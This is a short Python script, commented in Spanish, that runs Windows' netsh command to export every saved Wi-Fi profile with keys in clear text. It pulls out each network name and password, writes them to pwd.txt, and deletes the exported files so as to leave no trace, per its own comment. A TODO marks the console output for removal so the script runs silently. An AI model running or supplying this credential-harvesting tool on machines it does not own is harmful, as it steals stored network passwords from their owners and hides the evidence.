import subprocess
import os
import sys

# Crear un archivo para las contraseñas
archivo = open('pwd.txt', "w")
archivo.write("Aquí están tus passwords:\n\n")
archivo.close()

# Listas a utilizar
wifiArch = []
wifiNomb = []
wifiPwdd = []

# Utilizar el pitón para ejecutar comandos
# Con el comando "netsh wlan export profile key=clear" se
# obtienen todos los datos de las redes inalámbricas guardadas
# en una compu
comando = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"],
                         capture_output=True
                         ).stdout.decode()

# Obtener el directorio actual donde se ejecuta el programa
path = os.getcwd()

# Recorrer todos los archivos generados
for f in os.listdir(path):
    # Si los archivos inician con "Wi-Fi" y son tipo xml
    if f.startswith("Wi-Fi") and f.endswith(".xml"):
        # Guardar en la lista wifiArch
        wifiArch.append(f)

# TODO: Quitar para que no mande información a la línea de comandos
print(f"Encontradas {len(wifiArch)} redes")

# Recorrer la lista con los archivos
for i in wifiArch:
    k = 0
    # Abrir el archivo
    with open(i, 'r') as fx:
        # Recorrer línea por línea
        for line in fx.readlines():
            # Si en una de ellas se encuentra la etiqueta 'name'
            if 'name' in line and k == 0:
                strip = line.strip()
                frente = strip[6:]
                tras = frente[:-7]
                # Agregar el nombre de la red
                wifiNomb.append(tras)
                k = 1
            # Si en una de ellas se encuentra la etiqueta 'keyMaterial'
            if 'keyMaterial' in line:
                strip = line.strip()
                frente = strip[13:]
                tras = frente[:-14]
                # Agregar la contraseña
                wifiPwdd.append(tras)
    # Una vez abiertos, eliminar los archivos para no dejar rastro
    os.remove(i)

# Recorrer las redes y contraseñas obtenidas
for x, y in zip(wifiNomb, wifiPwdd):
    # Reabrir el archivo
    sys.stdout = open("pwd.txt", "a")
    # Escribir los nombres de las redes y contraseñas
    print("SSID: " + x, "Contrasena: " + y, sep='\n')
    # Cerrar el archivo
    sys.stdout.close()
